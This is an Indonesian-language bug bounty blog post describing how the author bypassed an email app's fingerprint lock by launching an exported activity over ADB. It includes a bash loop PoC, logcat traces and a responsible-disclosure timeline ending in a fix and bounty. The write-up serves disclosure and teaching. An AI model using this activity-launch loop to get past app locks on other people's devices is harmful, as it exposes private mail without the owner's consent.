---
layout: post
title: Bypass Fingerprint Lock in Just 1 Second!
date: 2019-12-22 10:00:00 PM
permalink: /project/2019-12-22-bypass-fingerprint-lock-in-just-1-second/
author: dw1
categories: [ reverse-engineer, apk, bugbounty, missconfig ]
tags: reverse-engineering baksmali disassembler apk android-package bypass fingerprint biometric
comments: true
image: https://user-images.githubusercontent.com/25837540/71323530-eaf24980-2506-11ea-9c8d-6f8558eb77f9.jpg
featured: true
---

![ilustrasi](https://user-images.githubusercontent.com/25837540/71323530-eaf24980-2506-11ea-9c8d-6f8558eb77f9.jpg)

### TL;DR

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Maaf jika kurang _click-bait_ dalam membuat judul, soalnya saya bukan jurnalis media _Turbin_, tapi web ini 'nggak ada iklannya, kok. Karena _gabut_ bingung _weekend_ 'nggak tau mau ngapain, tisu juga udah habis, tapi `kau boleh duduk diam jika bangga jadi budak, dan gantungkan cita dengan upah di awal bulan`, membaca laporan _public disclosure_ pada _[Hacktivity](https://hackerone.com/hacktivity?querystring=&filter=type:public&order_direction=DESC&order_field=latest_disclosable_activity_at)_ dengan penyortiran terbaru di HackerOne adalah keseharian saya, **ke*****gabut*****an adalah salah satu sumber pengetahuan**.

Beberapa bulan yang lalu saya membaca laporan ini [https://hackerone.com/reports/637194](https://hackerone.com/reports/637194), kemudian saya langsung berpikir, _"Wah, boljug, nih! Bentar, saya cari dulu aplikasi serupa (memiliki fitur membuka kunci dengan pengenalan sidik jari) yang sudah ter-install di smartphone saya."_, akhirnya ditemukan aplikasi layanan ***e-mail hosting***.

Salah satu metode untuk melindungi informasi/konten sensitif dalam aplikasi Anda adalah dengan menggunakan otentikasi biometrik, seperti menggunakan pengenalan wajah _(face recognition)_ atau pengenalan sidik jari _(fingerprint recognition)_.

### Reproduces

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Saya langsung menghubungkan perangkat Android menggunakan Mode USB Debugging pada laptop dan menjalankan perintah `adb logcat | grep 'com.package.name'` _(agar lebih human-readable dan colorful, gunakan [pidcat](https://github.com/JakeWharton/pidcat))_ untuk mengetahui aktivitas aplikasi, saya catat setiap detail log-nya dari mulai ***"Membuka Aplikasi > Menampilkan Dialog Otentikasi Fingerprint > Otentikasi Berhasil/Gagal > Menampilkan Layar Utama Aplikasi"***, lalu melakukan sedikit analisa pada APK _**(Baca juga: [Cara Reverse Engineering APK](https://noobsec.org/project/2018-11-04-cara-reverse-engineering-apk/))**_ dengan membaca file `AndroidManifest.xml`.

**Apa _sih_ file _AndroidManifest.xml_?**

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File manifes menjelaskan informasi penting tentang aplikasi ke fitur build Android, sistem operasi Android, dan Google Play. Diluar itu, file tersebut diperlukan untuk mendeklarasikan; nama paket aplikasi _(package name)_, komponen aplikasi `(activity, service, broadcast receiver, content provider)`, izin yang diperlukan, fitur _hardware/software_ yang diperlukan aplikasi. Itu semua nge-_kost_ pada file `AndroidManifest.xml`.

Membaca baris-per-baris serta mencari _activity_ yang diekspor `(android:exported=true)`. Elemen ini menetapkan apakah aktivitas dapat diluncurkan oleh komponen aplikasi lain atau _'nggak_? Jika tidak, aktivitas hanya dapat diluncurkan oleh komponen dari aplikasi yang sama atau aplikasi dengan ID pengguna yang sama.

> Catat: Jika `activity` mempunyai _intent filters_, maka elemen `android:exported` otomatis bernilai `true`.

Saya mendapati _activity_ yang diekspor, dengan begitu saya langsung menjalankan perintah `adb shell am start -n com.package.name/[com.package.name].ProfileActivity`, dan benar saja, itu menjadi batu loncatan _(shortcut)_ untuk membuka halaman Profil aplikasi.

> Di dalam ADB shell, perintah `am` _(activity manager)_ adalah untuk melakukan berbagai tindakan sistem, seperti; memulai aktivitas, menghentikan paksa proses, menyiarkan/_broadcast_ sebuah _intent_, memodifikasi properti layar _(screen properties)_ perangkat, dan banyak lagi.

**Apa yang terjadi jika saya melakukan pelompatan aktivitas jika belum terotentikasi?**

```
08-22 04:36:50.073  2187  2187 V FingerprintService: startAuthentication(com.package.name), mReqId:0
08-22 04:36:50.073  2187  2187 V FingerprintService: starting client AuthenticationClient(com.package.name), initiatedByClient = true
08-22 04:36:50.081  2187  2187 W FingerprintService: client com.package.name is authenticating...
08-22 04:36:50.129   731   731 D SurfaceFlinger: duplicate layer name: changing com.package.name/com.package.name.applock.PasscodeLockActivity to com.package.name/com.package.name.applock.PasscodeLockActivity#1
08-22 04:36:50.214  2187  2209 I ActivityManager: Displayed com.package.name/com.package.name.applock.PasscodeLockActivity: +355ms (total +1s497ms)
08-22 04:36:50.215  2187  2209 I Timeline: Timeline: Activity_windows_visible id: ActivityRecord{eed92ce u0 com.package.name/com.package.name.applock.PasscodeLockActivity t6140} time:121690361
08-22 04:36:50.375   731  2962 W SurfaceFlinger: Attempting to set client state on removed layer: Splash Screen com.package.name#0
08-22 04:36:50.376   731  2962 W SurfaceFlinger: Attempting to destroy on removed layer: Splash Screen com.package.name#0
08-22 04:36:51.156  2187  3749 W AccountManagerService: insertAccountIntoDatabase: Account {name=REDACTED COMPANY, type=com.package.name.analytics}, skipping since the account already exists
08-22 04:36:56.918  2187  3607 I ActivityManager: START u0 {flg=0x10000000 cmp=com.package.name/.android.activities.InboxActivity} from uid 2000
08-22 04:36:56.925  2187  3607 D ActivityTrigger: activityStartTrigger: Activity is Triggerred in full screen ApplicationInfo{db4d224 com.package.name}
08-22 04:36:56.925  2187  3607 E ActivityTrigger: activityStartTrigger: not whiteListedcom.package.name/com.package.name.android.activities.InboxActivity/86
```

Seperti yang terlihat `traces` dari `logcat` di atas, `SurfaceFlinger` mendeteksi layer duplikat serta mencoba `set client state on removed layer` dan `destroy on removed layer`.

**Hah? _SurfaceFlinger_?**

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`SurfaceFlinger` adalah layanan yang memainkan peran penting dalam menentukan apa yang ditampilkan di layar. TAPI,`SurfaceFlinger` tidak menampilkan apapun ke layar, ia hanya menerima buffer dari data yang nampak, mengompositkannya ke dalam _single_ buffer, dan kemudian meneruskannya ke HAL _(Hardware Abstraction Layer)_.

**Apa itu HAL _(Hardware Abstraction Layer)_?**

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Layer HAL sebenarnya menjembatani keterbatasan antara _software_ yang berjalan di Android dan _hardware_ yang sebenarnya bertanggung jawab untuk menjalankan sistem operasi. Layer ini memungkinkan Android berjalan secara efektif di ribuan perangkat yang berbeda.

**Darimana _SurfaceFlinger_ mendapatkan _buffer_?**

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Di sebagian besar aplikasi Android, `SurfaceFlinger` memiliki akses ke tiga buffer berbeda. Buffer untuk **Bar Status**, **Bar Navigasi**, dan buffer untuk **konten aplikasi**. 

![3parts](https://user-images.githubusercontent.com/25837540/71321357-c4261a00-24ea-11ea-89fd-69d32a4f66ff.jpg)

**Jadi, ada berapa banyak _buffer_?**

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dalam sebagian besar aplikasi, Anda hanya akan mendapatkan 3 buffer, bisa lebih dan atau mungkin kurang dari 3 buffer.

Kita tahu bahwa kita dapat menyembunyikan Bar Status dengan mengatur `flag WindowManager` yang sesuai _(atau menggunakan tema yang bisa menghilangkan Bar Status dan/ aplikasi tersebut memang dalam mode full-screen)_. Dalam kasus ini, berarti hanya memiliki 2 buffer.

Contoh lain, kita dapat memiliki 4 atau lebih buffer dengan menyertakan `SurfaceView` dalam aplikasi kita. Setiap `SurfaceView` akan memiliki buffer sendiri yang disusun oleh `SurfaceFlinger` _(bukan dari aplikasi)_.

**Bagaimana _SurfaceFlinger_ berkerja?**

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Google telah membuat diagram keren yang menunjukkan aliran data dari awal hingga me-rendernya.

![ape_fwk_graphics](https://user-images.githubusercontent.com/25837540/71321386-0e0f0000-24eb-11ea-9741-8f44655fdce7.png)

Pada gambar di atas, Anda dapat melihat bahwa banyak komponen berbeda dapat membuat data buffer. Data buffer masuk ke `SurfaceFlinger` _(atau aplikasi OpenGL ES)_ dan akhirnya ke HAL sehingga dapat ditampilkan di layar.

### Proof of Concept

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Saya coba membuat script bash pengulangan pelompatatan aktivitas sederhana untuk melakukan `heap corruption`.

```bash
#!/bin/bash

c=0
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
NC="\033[0m"

while :;
do
	TIME="[$(date +%T)]"
	START=$(adb shell am start -n com.package.name/.android.activities.InboxActivity)
	if [[ $START == *"Warning"* ]]; then
		if [[ $c != 0 ]]; then
			echo -e "${GREEN}${TIME} Bypass OK!${NC}"
			exit
		else
			echo -e "${YELLOW}${TIME} Try more${NC}"
			((c++))
		fi
	else
		echo -e "${TIME} Bypassing..."
		c=0
	fi
done
```

Pernyataan `Warning` adalah jika pelompatan aktivitas merespon `Warning: Activity not started, intent has been delivered to currently running top-most instance`.

```
08-22 04:36:57.602   731   731 D SurfaceFlinger: duplicate layer name: changing com.package.name/com.package.name.android.activities.InboxActivity to com.package.name/com.package.name.android.activities.InboxActivity#1
```

Jika pelompatan aktivitas mengalami itu lebih dari 1 kali, maka saya asumsikan itu telah terjadi `heap corruption`.

```
08-22 04:36:58.354  2187  2379 W ActivityManager: Duplicate finish request for ActivityRecord{f55234d u0 com.package.name/.android.activities.InboxActivity t6140 f}
08-22 04:36:58.356  2421  2421 I Timeline: Timeline: Activity_launch_request time:121698502 intent:Intent { flg=0x10000000 cmp=com.package.name/.android.activities.InboxActivity }
08-22 04:36:58.356  2187  2379 I ActivityManager: START u0 {flg=0x10000000 cmp=com.package.name/.android.activities.InboxActivity} from uid 10346
08-22 04:36:58.368  2187  2379 D ActivityTrigger: activityStartTrigger: Activity is Triggerred in full screen ApplicationInfo{8dbc0fe com.package.name}
08-22 04:36:58.368  2187  2379 E ActivityTrigger: activityStartTrigger: not whiteListedcom.package.name/com.package.name.android.activities.InboxActivity/86
08-22 04:36:58.369  2187  2379 D ActivityTrigger: activityResumeTrigger: The activity in ApplicationInfo{8dbc0fe com.package.name} is now in focus andseems to be in full-screen mode
08-22 04:36:58.369  2187  2379 E ActivityTrigger: activityResumeTrigger: not whiteListedcom.package.name/com.package.name.android.activities.InboxActivity/86
08-22 04:36:58.451  2187  2379 D ActivityTrigger: activityResumeTrigger: The activity in ApplicationInfo{8dbc0fe com.package.name} is now in focus andseems to be in full-screen mode
08-22 04:36:58.451  2187  2379 E ActivityTrigger: activityResumeTrigger: not whiteListedcom.package.name/com.package.name.android.activities.InboxActivity/86
08-22 04:36:58.722   731   731 D SurfaceFlinger: duplicate layer name: changing com.package.name/com.package.name.android.activities.InboxActivity to com.package.name/com.package.name.android.activities.InboxActivity#3
08-22 04:36:59.100  2187  2209 I ActivityManager: Displayed com.package.name/.android.activities.InboxActivity: +631ms (total +2s143ms)
08-22 04:36:59.349  2421  2430 I chatty  : uid=10346(com.package.name) FinalizerDaemon identical 5 lines
08-22 04:36:59.428  2187  2209 I Timeline: Timeline: Activity_windows_visible id: ActivityRecord{935b703 u0 com.package.name/.android.activities.InboxActivity t6140} time:121699574
08-22 04:36:59.770  2187  2187 V FingerprintService: stop client com.package.name
08-22 04:36:59.789  2187  2187 W FingerprintService: client com.package.name is no longer authenticating
08-22 04:36:59.793  2187  2187 V FingerprintService: Done with client: com.package.name
08-22 04:36:59.793  2187  2187 V FingerprintService: handleError(client=com.package.name, error = 5)
```

Dan... Boom! Benar saja.

```
08-22 04:36:59.789 2187 2187 W FingerprintService: client com.package.name is no longer authenticating
```

![video_poc](https://user-images.githubusercontent.com/25837540/71322914-95666e80-24ff-11ea-985c-85116fcb970f.gif)

_Sorry, kebanyakan disensor udah kaya nonton JavHD._

### Timeline

```
Aug 22, 2019 05:31:12 AM - Celah dilaporkan.
Aug 22, 2019 08:36:45 AM - Laporan diterima & diinvestigasi oleh tim.
Aug 22, 2019 12:19:53 PM - Tim tidak dapat mereproduksi celah dari sisi mereka & meminta saya untuk memberikan informasi lebih.
Aug 22, 2019 12:38:34 PM - Saya memberi informasi dengan cara yang mudah untuk mereproduksi celah.
Aug 22, 2019 01:03:41 PM - Saya memberikan bukti yang lebih jelas.
Aug 22, 2019 01:27:16 PM - Tim mengkonfirmasi bahwa telah berhasil untuk mereproduksi celah.
Aug 23, 2019 10:07:44 AM - Saya meminta status perkembangan laporan.
Aug 26, 2019 11:35:37 AM - Tim menjawab sendang dianalisa & melakukan perbaikan.
Aug 30, 2019 02:29:47 PM - Saya meminta status perkembangan laporan.
--- Tetap tidak ada perkembangan ---
Sep 05, 2019 11:31:47 PM - Celah telah diperbaiki & sedang dalam proses push ke versi terbaru pada app store.
Sep 12, 2019 07:32:33 PM - Versi terbaru dirilis, tim meminta saya untuk melakukan tes production & mengkonfirmasi saya bahwa celah sudah diperbaiki.
Sep 12, 2019 08:56:56 PM - Bounty diberikan.
Sep 14, 2019 10:33:21 AM - Saya mengkonfirmasi bahwa celah sudah diperbaiki pada versi terbarunya.
```